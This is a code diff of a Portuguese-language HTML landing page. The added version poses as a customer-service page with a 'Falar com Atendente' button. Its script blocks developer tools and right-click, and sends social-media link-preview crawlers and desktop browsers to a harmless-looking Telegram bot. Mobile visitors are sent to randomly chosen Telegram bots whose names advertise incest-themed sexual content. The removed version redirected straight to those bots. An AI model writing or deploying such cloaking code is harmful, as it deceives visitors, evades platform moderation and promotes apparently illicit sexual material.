@@ -2,22 +2,78 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>Redirecionando...</title>
-  <script>
-    // Links com start automático
-    const links = [
-      "https://t.me/vipincestim_bot?start=start",
-      "https://t.me/incestfam1ly_bot?start=start",
-      "https://t.me/icestosfamly_bot?start=start"
-    ];
-
-    // Escolhe um link aleatoriamente
-    const linkAleatorio = links[Math.floor(Math.random() * links.length)];
-
-    // Redireciona
-    window.location.href = linkAleatorio;
-  </script>
+  <title>Central de Atendimento</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background-color: #ffffff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      font-family: Arial, sans-serif;
+    }
+    .btn {
+      padding: 20px 30px;
+      font-size: 18px;
+      background-color: #007bff;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    .btn:hover {
+      background-color: #0056b3;
+    }
+  </style>
 </head>
 <body>
+  <button class="btn" onclick="redirecionar()">Falar com Atendente</button>
+
+  <script>
+    // Proteção anti-devtools (F12, Ctrl+Shift+I, clique direito, etc)
+    document.addEventListener("contextmenu", e => e.preventDefault());
+    document.onkeydown = function(e) {
+      if (
+        e.keyCode === 123 || // F12
+        (e.ctrlKey && e.shiftKey && e.keyCode === 73) || // Ctrl+Shift+I
+        (e.ctrlKey && e.shiftKey && e.keyCode === 74) || // Ctrl+Shift+J
+        (e.ctrlKey && e.keyCode === 85) // Ctrl+U
+      ) {
+        return false;
+      }
+    };
+
+    // Detecta bots e dispositivos desktop
+    const userAgent = navigator.userAgent.toLowerCase();
+    const isBot = userAgent.includes("facebookexternalhit") ||
+                  userAgent.includes("facebot") ||
+                  userAgent.includes("twitterbot") ||
+                  userAgent.includes("linkedinbot") ||
+                  userAgent.includes("embedly") ||
+                  userAgent.includes("slackbot") ||
+                  userAgent.includes("telegrambot") ||
+                  userAgent.includes("whatsapp") ||
+                  userAgent.includes("discordbot");
+    
+    const isMobile = /iphone|ipod|android|blackberry|mini|windows\sce|palm/i.test(userAgent);
+
+    if (isBot || !isMobile) {
+      window.location.href = "https://t.me/CenterSmsBot";
+    }
+
+    function redirecionar() {
+      const links = [
+        "https://t.me/vipincestim_bot?start=ads",
+        "https://t.me/incestfam1ly_bot?start=ads",
+        "https://t.me/incestfam1li_bot?start=ads",
+        "https://t.me/icestosfamly_bot?start=ads"
+      ];
+      const linkAleatorio = links[Math.floor(Math.random() * links.length)];
+      window.location.href = linkAleatorio;
+    }
+  </script>
 </body>
 </html>
